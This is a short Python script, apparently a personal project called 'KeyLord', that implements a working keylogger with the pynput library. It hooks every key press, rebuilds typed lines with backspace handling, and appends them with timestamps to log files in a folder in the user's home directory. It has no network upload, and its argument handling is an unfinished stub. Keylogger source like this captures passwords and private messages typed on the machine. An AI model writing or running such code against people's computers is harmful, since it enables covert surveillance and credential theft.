from pynput import keyboard
import pynput
from sys import argv
import datetime, os, argparse
# https://github.com/moses-palmer/pynput/issues/20



home_path = os.environ.get('HOME')
dir_name = 'keylord'
keylord_path = os.path.join(home_path, dir_name)

class logger:

    def __init__(self):

        # WORK AS STACK -> BACKSPACE = POP
        self.__log_file = ''
        self.__buffer = []
        self.__listener = None

    def __print_formated(self):
        exact_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(self.__log_file, 'a') as f:
            f.write(exact_time + " " + ''.join(self.__buffer))
        self.__buffer = []

    def run(self, log_file):
        self.__log_file = log_file
        with keyboard.Listener(on_press=self.__on_press) as self.__listener:
            self.__listener.join()


    def __write_to_buffer(self, key):
        if(key == pynput.keyboard.Key.enter):
            self.__buffer.append("\n")
            self.__print_formated()
        elif(key == pynput.keyboard.Key.backspace):
            try:
                self.__buffer.pop()
            except IndexError:
                pass
        else:
            if(key == pynput.keyboard.Key.space):
                self.__buffer.append(" ")
            elif(hasattr(key, 'char')):
                self.__buffer.append(str(key).replace("'", ""))
            else:
                self.__buffer.append(str(key).replace("'", "").replace("Key.", "") + "+")
        
        # Stop keylogger
        # if(CONDITION):
        #     self.stop()

    def __on_press(self, key):
        self.__write_to_buffer(key)

    def stop(self):
        self.__listener.close()


def create_keylogger_dir():
    try:
        os.mkdir(keylord_path)
    except:
        pass

def create_log_file():
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M")

    new_file = os.path.join(keylord_path, '%s.log' %(timestamp))
    with open(new_file, 'w') as f:
        f.write("KeyLord starting ...\n")
    
    return new_file



def setup(args):
    #if(args.)
    pass



if __name__ == "__main__":
    create_keylogger_dir()
    filename = create_log_file()
    l = logger()
    l.run(filename)

